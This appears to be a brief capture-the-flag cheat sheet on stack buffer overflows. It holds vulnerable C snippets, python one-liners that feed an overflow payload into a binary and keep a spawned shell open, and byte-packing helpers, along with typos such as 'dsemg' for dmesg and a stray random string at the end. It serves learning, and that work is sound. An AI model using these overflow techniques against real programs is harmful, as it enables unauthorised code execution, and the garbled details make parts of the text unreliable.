# PWN

***Binary exploitation***

## Stack buffer overflow
Example : buf is defined with 40 byte BUT 45 bytes are allowed in the fgets  
those bytes overflow to check variable...
```c
...
int check = 0x04030201;
char buf[40];
 
fgets(buf,45,stdin);
...
```
gets function doesn't take any lenght as a parameter so the buffer can be overflown
```c
gets(f);
```

dsemg tells us where the segmentation fault occurs if there was one
```bash
dsemg | tail
```


## Tips
- Using python to handle input is often a good solution because it handles some encryption as hex that a raw keyboard input doesn't
```bash
python -c 'print "z"*40 + "\xef\xbe\xad\xde"' | ./binary
```

- When a shell spawns but dispawns instantly, using `cat` can sometimes help
```bash
(python -c 'print "z"*40 + "\xef\xbe\xad\xde"';cat) | ./binary
```

- Convert an hew string to every structure (e.g. little endian / big endian)
https://docs.python.org/3/library/struct.html
```py
import struct
struct.pack("<I",0x0a0a5e05e)
```

```py
import pwn
pwn.p32(0x0a0a5e05e)
```
6GbHaoQSMKHDFFim58fFrAEcDDadQK76xdCecRYN
